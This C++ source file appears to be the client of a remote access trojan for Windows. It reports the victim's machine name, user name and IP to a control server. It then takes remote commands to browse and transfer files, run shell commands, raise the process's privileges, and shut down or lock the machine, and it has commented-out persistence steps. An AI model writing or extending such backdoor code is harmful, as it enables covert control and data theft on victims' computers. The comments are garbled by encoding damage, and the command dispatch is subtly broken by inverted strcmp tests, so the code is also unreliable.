#include "../tcpSocket/tcpSocke.h"

int GetPCMessage(SOCKET fd);//��ȡ�����������Ϣ

int FileBrowse(SOCKET fd);//�ļ����

int recvFile(SOCKET fd, char* buf);//�ļ�����

int sendFile(SOCKET fd, char* buf);//�ļ��ϴ�

int Shell(SOCKET fd, char* buf);//ִ��shellָ��

bool UpPrivilegeValue();//��Ȩ����

int main()
{
	//char pathName[MAX_PATH];//�ļ��������260���ַ�  MAX_PATH  260

	//copySelf(pathName);//���ļ����Ƶ�ϵͳĿ¼

	//ComputerStart(pathName);//���ó��򿪻�����

	init_Socket();//�����ͻ���socket

	SOCKET fd = CreatClientScoket("127.0.0.1");//����

	char str[] = "connect success";//���ӳɹ�
	encode(str);
	send(fd, str, strlen(str), 0);
	Sleep(200);

	GetPCMessage(fd);//��PC��Ϣ���͸������

	HeartBeat(fd);//��������

	char command[16] = {0};//�洢���յ�ָ��
	char recvbuf[BUFSIZ] = { 0 };//������Ϣ�Ļ�����
	//������Ӧ���̣߳���Ҫʹ��ʱ�ͼ���
	while (true)
	{
		recv(fd, command, 16, 0);
		decode(command);
		if (strcmp(command, "filebrowse"))
		{
			thread th1 = thread(FileBrowse, fd);
			th1.join();
			continue;
		}
		else if (strcmp(command, "shell"))
		{
			thread th2 = thread(Shell, fd, recvbuf);
			th2.join();
			continue;
		}
		else if(strcmp(command, "download"))
		{
			thread th3 = thread(sendFile, fd, recvbuf);
			th3.join();
			continue;
		}
		else if (strcmp(command, "upload"))
		{
			thread th4 = thread(recvFile, fd, recvbuf);
			th4.join();
			continue;
		}
		else if(strcmp(command, "upright"))
		{
			thread th5 = thread(UpPrivilegeValue);
			th5.join();
			continue;
		}
		else if (strcmp(command, "kill"))
		{
			char text[] = "Client has exit!";
			encode(text);
			send(fd, text, strlen(text), 0);//�رտͻ���
			exit(0);
			continue;
		}
		else if (strcmp(command, "kill"))
		{
			system("shutdown -s -t 1");//�ػ�
			continue;
		}
		else if (strcmp(command, "reboot"))
		{
			system("shutdown -r -t 10"); //����
			continue;
		}
		else if (strcmp(command, "cancel"))
		{
			system("shutdown -a");//ȡ���ػ�
			continue;
		}
		else if (strcmp(command, "lock"))
		{
			system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");//����
			continue;
		}
		else
		{
			send(fd, "Error code", strlen("Error code"), 0);//����ָ�����
			continue;
		}
		ZeroMemory(recvbuf, sizeof(recvbuf));//��ʼ��
		ZeroMemory(command, sizeof(command));//��ʼ��
		Sleep(2000);
	}
	closesocket(fd);//�رտͻ���socket

	close_Socket();//WSACleanup
}

int GetPCMessage(SOCKET fd)
{
	PC_Message msg;//����msg�ṹ��
	char UserName[BUFSIZ] = { 0 };//����ͳ�ʼ��

	if (getmessage(&msg) == false)//��ȡĿ��������IP����������Լ��û���
	{
		//err("getmessage");
	}

	TcharToChar(msg.UserName, UserName);//��TCHARת��Ϊchar
	encode(msg.PCName);//����
	//cout << msg.PCName << endl;
	encode(UserName);
	cout << strlen(msg.PCName) << endl;
	cout << UserName << endl;
	cout << strlen(UserName) << endl;
	encode(msg.IP);
	cout << strlen(msg.IP) << endl;
	//cout << msg.IP << endl;

	send(fd, msg.PCName, strlen(msg.PCName), 0);
	Sleep(200);
	
	send(fd, UserName, strlen(UserName), 0);
	Sleep(200);
	
	send(fd, msg.IP, strlen(msg.IP), 0);
	Sleep(200);
	
	return 0;
}

int FileBrowse(SOCKET fd)
{
	//��ȡC�̺�D���ڵ������ļ���
	char FileName[FileNameRow][FileNameCol];
	char Zero[FileNameCol] = { 0 };
	GetFileName(FileName);
	for (int i = 0; i < FileNameRow; i++)
	{
		if (strcmp(FileName[i], Zero))
		{
			//printf("%s\n", FileName[i]);
			send(fd, FileName[i], strlen(FileName[i]), 0);
		}
	}
	return 0;
}

int sendFile(SOCKET fd, char* buf)
{
	ZeroMemory(buf, sizeof(buf));
	recv(fd, buf, BUFSIZ, 0);//����Ҫ���ص��ļ���������·����
	char sendbuf[BUFSIZ * 2];
	DWORD dwRead;
	BOOL bRet;
	Sleep(200);

	HANDLE hFile = CreateFile((LPCWSTR)buf, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE) 
	{
		return 1;
	}
	while (true) 
	{   //�����ļ���buf
		bRet = ReadFile(hFile, sendbuf, 1024, &dwRead, NULL);
		if (bRet == FALSE)
		{
			break;
		}
		else if (dwRead == 0) 
		{
			Sleep(100);
			break;
		}
		else 
		{
			send(fd, sendbuf, dwRead, 0);
		}
	}
	char res[] = "success";
	encode(res);
	send(fd, res, strlen(res) + 1, 0);
	return 0;
}

int recvFile(SOCKET fd, char* buf)//�ļ�����
{
	ZeroMemory(buf, sizeof(buf));
	recv(fd, buf, BUFSIZ, 0);//����Ҫ�ϴ��ļ��ľ���·��
	int len;
	char recvBuf[1024] = { 0 };   // ������
	HANDLE hFile;               // �ļ����
	DWORD count;                // д������ݼ���

	hFile = CreateFile((LPCWSTR)buf, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_ARCHIVE, NULL);
	if (hFile == INVALID_HANDLE_VALUE) 
	{
		return 1;
	}
	char begin[] = "BEGIN";
	encode(begin);
	send(fd, begin, strlen(begin), 0);
	while (true) 
	{
		// �ӿͻ��˶�����
		ZeroMemory(recvBuf, sizeof(recvBuf));
		len = recv(fd, recvBuf, 1024, 0);
		decode(recvBuf);
		if (strlen(recvBuf) < 5) 
		{
			if (strcmp(recvBuf, "EOF") == 0) {
				CloseHandle(hFile);
				break;
			}
		}
		WriteFile(hFile, recvBuf, len, &count, 0);
	}
	Sleep(500);
	char RECV[] = "RECV";
	encode(RECV);
	send(fd, RECV, strlen(RECV), 0);
	return 0;
}

int Shell(SOCKET fd, char* buf)
{
	char shell[40] = { 0 };
	char res[BUFSIZ * 2] = { 0 };
	ZeroMemory(buf, sizeof(buf));
	recv(fd, buf, strlen(buf), 0);	//���շ�������shellָ��
	decode(buf);
	for (int i = 1; buf[i] != '\0'; i++) 
	{
		shell[i - 1] = buf[i];
	}
	if (!cmd(shell, res)) 
	{
		send(fd, res, strlen(res) + 1, 0);
	}
	else
	{
		char text[] = "CMD Error!";
		encode(text);
		send(fd, text, strlen(text), 0);
	}
	return 0;
}

bool UpPrivilegeValue()
{
	//OpenProcessToken()���������������������ķ�������
	HANDLE hToken = nullptr;
	if (FALSE == OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		return false;
	}
	//LookupPrivilegeValue()�����鿴ϵͳȨ�޵���Ȩֵ
	LUID luid;
	if (FALSE == LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
	{
		CloseHandle(hToken);
		return false;
	}
	//����Ȩ������
	TOKEN_PRIVILEGES Tok;
	Tok.PrivilegeCount = 1;
	Tok.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	Tok.Privileges[0].Luid = luid;
	if (FALSE == AdjustTokenPrivileges(hToken, FALSE, &Tok, sizeof(Tok), nullptr, nullptr))
	{
		CloseHandle(hToken);
		return false;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		CloseHandle(hToken);
		return false;
	}

	CloseHandle(hToken);
	return true;
}
